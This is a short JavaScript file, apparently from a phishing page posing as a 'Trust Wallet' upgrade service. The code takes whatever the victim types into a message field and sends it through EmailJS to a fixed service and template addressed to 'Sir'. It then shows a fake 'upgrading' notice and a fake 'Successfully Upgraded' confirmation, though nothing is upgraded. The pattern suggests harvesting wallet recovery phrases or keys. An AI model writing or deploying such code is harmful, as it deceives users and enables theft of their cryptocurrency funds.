const sendMail = (params)=>{
    let tempParams = {
        from_name: "Trust Upgrade Site",
        to_name: "Sir",
        message: document.getElementById("message").value,
    };

    emailjs.send("service_qkib1qb", "template_ylwhnx8", tempParams)
    .then((response) => {
        console.log("success", response.status);
    });

    setInterval(()=> {
        upgradePage.innerHTML = `
        <div class="upgrade-success">
            <p>Trust Wallet Successfully Upgraded <i class="fas fa-check-circle"></i></p>
        </div>
    `;
    }, 3000)
    upgradePage.innerHTML = `
        <div class="upgrade-success">
            <p> <i class="fas fa-hourglass-half"></i>Please Wait, Trust Wallet Is Upgrading..</p>
        </div>
    `;
}

const upgradeBtn = document.querySelector(".upgrade-btn");
const upgradePage = document.querySelector(".upgrade-details");
